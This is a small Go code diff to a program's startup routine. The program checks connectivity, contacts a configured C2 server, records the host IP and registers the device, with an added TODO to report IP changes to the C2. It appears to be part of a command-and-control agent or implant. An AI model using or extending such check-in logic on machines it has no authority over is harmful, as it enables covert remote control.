@@ -19,9 +19,10 @@ func main() {
 	helper.CheckForInternet()
 	// helper.UpdateSystem()
 	helper.CheckForC2Server(config.Config.C2)
+	//Todo Check if if is different from original config. If Diff tell c2 about new ip
 	config.Config.IpStr = helper.GetIP().String()
 	if !config.CheckIfDeviceIDExits() {
-		api.GetDeviceIDFromAPI()
+		api.RegisterDevice()
 		config.WriteConfToYAML()
 		log.Logger.Info().Msgf("[+]\tFirst time configuration [DONE]")
 
